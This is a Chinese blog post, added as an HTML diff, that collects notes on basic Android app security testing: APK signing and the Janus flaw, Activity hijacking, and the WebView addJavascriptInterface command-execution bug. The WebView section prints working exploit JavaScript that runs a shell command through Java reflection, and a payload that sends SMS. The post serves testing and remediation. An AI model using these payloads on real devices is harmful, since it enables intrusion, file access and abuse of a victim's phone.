@@ -1,0 +1,792 @@
+<!DOCTYPE html>
+<html lang="zh-hans">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="Fanxs">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Fanxs">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="Fire at the hole.">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>【整理笔记】Android APP基础安全测试 · Mrfan&#39;s Room.</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/bm.png">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin="">
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin="">
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">Mrfan&#39;s Room.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">【整理笔记】Android APP基础安全测试</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href="/">Mrfan's Room.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(https://source.unsplash.com/1600x900/?macbook)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            【整理笔记】Android APP基础安全测试
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class="post-intro-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="整理笔记">整理笔记</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="Android">Android</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">2.8k</span>阅读时长: <span class="post-count reading-time">11 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/10/29</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <blockquote>
+<p>前言：<br>在公司时，会接到很多APP的测试项目，其中就包括移动端安全的基本测试。由于本人对移动端安全没有很多的研究，在单独做这些项目时会遇到很多的困难，所以专门总结了这篇文章，<strong>以供自己测试需要</strong>。大佬请提出建议或有效避让。</p>
+</blockquote>
+<h1 id="客户端安全"><a href="#客户端安全" class="headerlink" title="客户端安全"></a>客户端安全</h1><h2 id="签名安全"><a href="#签名安全" class="headerlink" title="签名安全"></a>签名安全</h2><h3 id="检测目的"><a href="#检测目的" class="headerlink" title="检测目的"></a>检测目的</h3><p>检测客户端安装包是否正确签名。通过签名，可以检测出安装包在签名后是否被修改过。</p>
+<h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>1.查看META-INF目录下的文件，若存在.SF和.RSA文件，则说明APP已经过了签名。<br>2.利用GetApkInfo.jar，查看是否使用v2.0签名机制。</p>
+<h3 id="检测详情"><a href="#检测详情" class="headerlink" title="检测详情"></a>检测详情</h3><p>使用GetAPKInfo:<br><img src="http://148.70.228.11/upload/bab34afe0fae832d4ef6dc54888e008e.png" alt=""></p>
+<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>使用v1.0 + v2.0对APP进行签名。</p>
+<h3 id="相关背景"><a href="#相关背景" class="headerlink" title="相关背景"></a>相关背景</h3><p>开发者发布了一个应用，该应用一定需要开发者使用他的私钥对其进行签名。恶意攻击者如果尝试修改了这个应用中的任何一个文件（包括代码和资源等），那么他就必须对APK进行重新签名，否则修改过的应用是无法安装到任何Android设备上的。但如果恶意攻击者用另一把私钥对APK签了名，并将这个修改过的APK对用户手机里的已有应用升级时，就会出现签名不一致的情况。因此，在正常情况下，Android的签名机制起到了防篡改的作用。 </p>
+<p><strong>v1.0签名的过程为：</strong></p>
+<ol>
+<li>遍历apk中的所有子目录和文件，计算每个文件的SHA1摘要，然后用base64进行编码。将编码后的字符串和文件的路径存入MANIFEST.MF文件，如下图：<br><img src="http://148.70.228.11/upload/e6788ef9b3e4058e8aea4cfe45bf7cb3.png" alt=""></li>
+<li>计算MANIFEST.MF文件的SHA1摘要，base64编码之后存入CERT.SF文件的SHA1-Digest-Manifest字段中。遍历MANIFEST.MF文件的所有项，计算每项的SHA1摘要，base64编码之后存入CERT.SF文件，如下图：<br><img src="http://148.70.228.11/upload/0cd2fc118ef72ec6d755c9f2df5d306f.png" alt=""><br>3.用私钥计算出CERT.SF的数字签名，将此签名值以及公钥信息写入CERT.RSA</li>
+</ol>
+<p><strong>验签过程：</strong><br>Android手机在安装App的时候，会对App的签名进行验证。只有签名验证通过，才能安装在手机上。验签过程和签名过程对应，分如下几步：<br>1.计算App里每个文件的SHA1摘要并进行base64编码，将结果与MANIFEST.MF文件中的对应项进行比对，确认是否相同。</p>
+<p>2.遍历MANIFEST.MF文件，计算每项的SHA1摘要并进行base64编码，将结果与CERT.SF文件中的对应项进行比对，确认是否相同。</p>
+<p>3.验证CERT.SF文件的签名信息和CERT.RSA中的内容是否相同。</p>
+<p><strong>Janus漏洞和v2.0签名</strong><br>Janus（CVE-2017-13156），该漏洞允许攻击者任意修改Android应用中的代码，而不会影响其签名。<br>Janus漏洞具体：</p>
+<blockquote>
+<p><a href="http://www.droidsec.cn/janus%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">http://www.droidsec.cn/janus%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E5%88%86%E6%9E%90/</a></p>
+</blockquote>
+<p>Janus攻击步骤：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 从设备上取出目标应用的APK文件，并构造用于攻击的DEX文件；</span><br><span class="line">2.将攻击DEX文件与原APK文件简单拼接为一个新的文件；</span><br><span class="line">3.修复这个合并后的新文件的ZIP格式部分和DEX格式部分；</span><br></pre></td></tr></table></figure></p>
+<p>修复方案为使用v2.0签名机制。</p>
+<p>v1.0和v2.0两个版本的签名区别在于，前者是对APK中的每个文件进行签名，如果APK中某个文件被篡改了，那么签名验证将会通不过；后者则是对整个APK文件进行签名，只要APK文件的内容发生变化则签名失效。<br><img src="http://148.70.228.11/upload/207c572644c8192d0c40cab1b663f66c.png" alt=""><br>使用 APK 签名方案 v2 进行签名时，会在 APK 文件中插入一个 APK 签名分块，该分块位于“ZIP 中央目录”部分之前并紧邻该部分。在“APK 签名分块”内，v2 签名和签名者身份信息会存储在 APK 签名方案 v2 分块中。<br><img src="http://148.70.228.11/upload/365849b55a3c4109abc4292083a44804.png" alt=""><br><strong>图 1.</strong> 签名前和签名后的 APK</p>
+<p>APK 签名方案 v2 是在 Android 7.0 (Nougat) 中引入的。为了使 APK 可在 Android 6.0<br>(Marshmallow) 及更低版本的设备上安装，应先使用 JAR 签名功能对 APK 进行签名，然后再使用 v2 方案对其进行签名。</p>
+<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p><strong>Android应用签名使用方法：</strong><br>1.选择Generate Signed APK<br><img src="http://148.70.228.11/upload/8bc9649cb47be36db3f4de209c3860fc.png" alt=""></p>
+<ol start="2">
+<li>选择证书或创建证书：<br><img src="http://148.70.228.11/upload/bd68f4d62d655162c9fd6987c44d1e86.png" alt=""><br>选择已有的证书：<br><img src="http://148.70.228.11/upload/11b0665c67728f3e40e7192a879b1cce.png" alt=""></li>
+<li>数字证书创建或选择完成后，点击OK—–&gt;点击Next——&gt;Finish。<br>注意：生成后的数字证书千万不能丢失，还有密码也不能忘记了。因为这些东西对app以后的版本升级至关重要</li>
+</ol>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://source.android.com/security/apksigning/v2" target="_blank" rel="noopener">https://source.android.com/security/apksigning/v2</a><br><a href="https://blog.csdn.net/qq309909897/article/details/72234968" target="_blank" rel="noopener">https://blog.csdn.net/qq309909897/article/details/72234968</a></p>
+<hr>
+<h2 id="Activity劫持"><a href="#Activity劫持" class="headerlink" title="Activity劫持"></a>Activity劫持</h2><h3 id="检测目的-1"><a href="#检测目的-1" class="headerlink" title="检测目的"></a>检测目的</h3><p>检测应用登录Activity组件是否可被劫持。攻击者可以在本地监听用户的状态，当用户登陆或者输入交易密码时，弹出伪造的界面诱骗用户输入正确的账号口令，从而窃取用户信息。</p>
+<h3 id="方法-1"><a href="#方法-1" class="headerlink" title="方法"></a>方法</h3><ol>
+<li>编写并安装恶意APP，针对目标测试APP进行Activity拦截。</li>
+<li>开启拦截后，打开目标APP，弹出拦截页面后，查看原测试APP是否存在相关的弹窗或提醒，告诉用户APP已进入后台。</li>
+</ol>
+<h3 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h3><p>这个问题无法从根本上解决，一般方法是在Activity被顶替时，显示提醒消息来警示用户。<br><code>https://github.com/1van/ActivityHijacker</code><br>这个项目里写了通用的方法：<br><img src="http://148.70.228.11/upload/2afc60fa3b2f29c3df5c54e5e44ff73f.png" alt=""></p>
+<h3 id="相关背景-1"><a href="#相关背景-1" class="headerlink" title="相关背景"></a>相关背景</h3><p><strong>Activity劫持</strong>，就是APP正常的Activity界面被恶意攻击APP的界面顶替，以仿冒的钓鱼Activity界面骗取用户的信息。举个例子来说，当用户打开安卓手机上的某一应用，进入到登陆页面，这时，恶意软件侦测到用户的这一动作，立即弹出一个与该应用界面相同的Activity，覆盖掉了合法的Activity，骗取用户的账号密码。</p>
+<p>Activity劫持漏洞的根本原因是：</p>
+<ol>
+<li>Android系统提供给了所有APP应用无需权限声明，<strong>枚举当前运行进程的API</strong>。</li>
+<li>Android系统的Activity调度系统AmS（ActivityManagerService）使用栈结构来调度Activity,会展示栈顶的Activity界面。而任意APP或Service,都可以在启动一个Activity时，设置标志位FLAG_ACTIVITY_NEW_TASK，将这个Activity置于栈顶，覆盖掉展示的界面。</li>
+</ol>
+<p>由上可见，此漏洞的产生原因是Android系统本身提供了所有APP这样做的能力，故根本无法从根本上防御。恶意APP程序，可以注册1个开机自启的后台service, 不断轮询当前的运行进程，当发现目标APP启动时，就启动1个仿冒的钓鱼Activity覆盖掉当前Activity，劫持了目标APP的界面。</p>
+<h3 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h3><p><a href="https://github.com/1van/ActivityHijacker" target="_blank" rel="noopener">https://github.com/1van/ActivityHijacker</a></p>
+<hr>
+<h2 id="WebView命令执行漏洞-addJavascriptInterface"><a href="#WebView命令执行漏洞-addJavascriptInterface" class="headerlink" title="WebView命令执行漏洞 - addJavascriptInterface"></a>WebView命令执行漏洞 - addJavascriptInterface</h2><h3 id="检测目的-2"><a href="#检测目的-2" class="headerlink" title="检测目的"></a>检测目的</h3><p> WebView组件存在严重的命令执行漏洞。当WebView中使用了addJavascriptInterface()接口时，远程攻击者可在恶意页面中调用Java Reflection API来执行任意Java对象的方法，执行任意命令。该漏洞影响Android API level 16以及之前的版本（即Android 4.2之前的系统）</p>
+<h3 id="方法-2"><a href="#方法-2" class="headerlink" title="方法"></a>方法</h3><p>劫持APP发出的HTTP请求，在返回的HTML中加入Webview的测试元素，或使用检测的HTML直接替代返回的HTML数据。</p>
+<h3 id="检测详情-1"><a href="#检测详情-1" class="headerlink" title="检测详情"></a>检测详情</h3><p>Webview命令执行的测试HTML为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;UTF-8&quot; /&gt;</span><br><span class="line">&lt;title&gt;WebView Test&lt;/title&gt;</span><br><span class="line">&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, maximum-scale=1.0, </span><br><span class="line">user-scalable=0&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;&lt;b&gt;If the application has the webview vulnerability, then the vulnerable interfaces </span><br><span class="line">will be shown below.!!&lt;/b&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">function check()&#123;</span><br><span class="line">  for (var obj in window)&#123;</span><br><span class="line">    try &#123;</span><br><span class="line">      if (&quot;getClass&quot; in window[obj]) &#123;</span><br><span class="line">         try&#123;</span><br><span class="line">            window[obj].getClass();</span><br><span class="line">            document.write(&apos;&lt;span </span><br><span class="line">style=&quot;color:red&quot;&gt;&apos;+obj+&apos;&lt;/span&gt;&apos;);                              </span><br><span class="line">            document.write(&apos;&lt;br /&gt;&apos;);</span><br><span class="line">         &#125;catch(e)&#123; &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; catch(e) &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; </span><br><span class="line">check();</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<p>遍历所有的HTML元素，寻找是否存在可利用的Webview接口。</p>
+<h3 id="修复建议-2"><a href="#修复建议-2" class="headerlink" title="修复建议"></a>修复建议</h3><p><strong>Android 4.2版本号之后</strong><br>Google 在Android 4.2 版本号中规定对被调用的函数以 @JavascriptInterface进行注解从而避免漏洞攻击，用 @JavascriptInterface  代替addjavascriptInterface</p>
+<p><strong>Android 4.2版本号之前</strong><br>修改调用方式，利用prompt<br>详情参考：</p>
+<blockquote>
+<p><a href="https://blog.csdn.net/xyz_lmn/article/details/39399225/" target="_blank" rel="noopener">https://blog.csdn.net/xyz_lmn/article/details/39399225/</a><br><a href="https://www.cnblogs.com/jhcelue/p/7338791.html" target="_blank" rel="noopener">https://www.cnblogs.com/jhcelue/p/7338791.html</a></p>
+</blockquote>
+<h3 id="相关背景-2"><a href="#相关背景-2" class="headerlink" title="相关背景"></a>相关背景</h3><p>WebView组件允许WebView中加载的JS文件，通过addJavascriptIntetface的接口来映射对象，调用APP中的方法。</p>
+<p>addJavascriptInterface:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">webView.addJavascriptInterface(new JSObject(), &quot;myObj&quot;);</span><br><span class="line">// 參数1：Android的本地对象</span><br><span class="line">// 參数2：JS的对象</span><br><span class="line">// 通过对象映射将Android中的本地对象和JS中的对象进行关联，从而实现JS调用Android的对象和方法</span><br></pre></td></tr></table></figure></p>
+<p>若App的代码中使用了webView.addJavascriptInterface绑定了js对象和java对象，则当webview中加载的Js用到这个对象时，就能够调用这个对象中所有的方法，包括系统类（java.lang.Runtime类）的方法，从而实现任意代码执行。</p>
+<p>具体流程为：</p>
+<ol>
+<li>Js调用addJavascriptInterface绑定的对象（”myObj”）</li>
+<li>调用所有对象都有的公共反射方法:getClass()，获取当前类</li>
+<li>利用反射调用forName(“java.lang.Runtime”)，得到Runtime类</li>
+<li>再用反射getMethod想要调用的方法，用invode调用，exec执行。</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function execute(cmdArgs)  </span><br><span class="line">&#123;</span><br><span class="line">// 步骤1：遍历 window 对象</span><br><span class="line">// 目的是为了找到包含 getClass （）的对象</span><br><span class="line">// 因为Android映射的JS对象也在window中，所以肯定会遍历到</span><br><span class="line">for (var obj in window) &#123;  </span><br><span class="line">    if (&quot;getClass&quot; in window[obj]) &#123;  </span><br><span class="line">    // 步骤2：利用反射调用forName（）得到Runtime类对象</span><br><span class="line">    // 步骤3：以后，就能够调用静态方法来运行一些命令。比方訪问文件的命令</span><br><span class="line">         alert(obj);                                        </span><br><span class="line">         return window[obj].getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(cmdArgs);  </span><br><span class="line"></span><br><span class="line">    // 从运行命令后返回的输入流中得到字符串。有非常严重暴露隐私的危急。</span><br><span class="line">    // 如运行完訪问文件的命令之后，就能够得到文件名称的信息了。</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;&#125;</span><br><span class="line">var res = execute([&quot;/system/bin/sh&quot;, &quot;-c&quot;, &quot;ls -al /mnt/sdcard/&quot;]);</span><br><span class="line">document.write(getContents(res.getInputStream()));</span><br></pre></td></tr></table></figure>
+<p>当一些 APP 通过扫描二维码打开一个外部网页， 或诱使受害者打开恶意网页、浏览恶意微博或者向受害者发送恶意邮件，攻击者就能够运行这段 js 代码进行漏洞攻击。</p>
+<p>利用此漏洞也可以执行其他的操作，如发短信：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var objSmsManager =     injectedObj.getClass().forName(&quot;android.telephony.SmsManager&quot;).getM ethod(&quot;getDefault&quot;,null).invoke(null,null);</span><br><span class="line">    objSmsManager.sendTextMessage(&quot;10086&quot;,null,&quot;this message is sent by JS when webview is loading&quot;,null,null);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<p>还可以利用此漏洞给系统装上恶意APP、挂马、反弹shell、执行ELF等。</p>
+<h3 id="参考-2"><a href="#参考-2" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/jhcelue/p/7338791.html" target="_blank" rel="noopener">https://www.cnblogs.com/jhcelue/p/7338791.html</a><br><a href="https://blog.csdn.net/feizhixuan46789/article/details/49155369" target="_blank" rel="noopener">https://blog.csdn.net/feizhixuan46789/article/details/49155369</a></p>
+
+    </article>
+    <!-- license  -->
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2019/07/28/记一次APP加密通信后的分析过程/" title="记一次APP加密通信后的分析过程">
+                    <div class="nextTitle">记一次APP加密通信后的分析过程</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2018/10/23/【整理笔记】格式化字符串漏洞梳理/" title="【整理笔记】格式化字符串漏洞梳理">
+                    <div class="prevTitle">【整理笔记】格式化字符串漏洞梳理</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:tweixiu@gmail.com" class="iconfont-archer email" title="email"></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
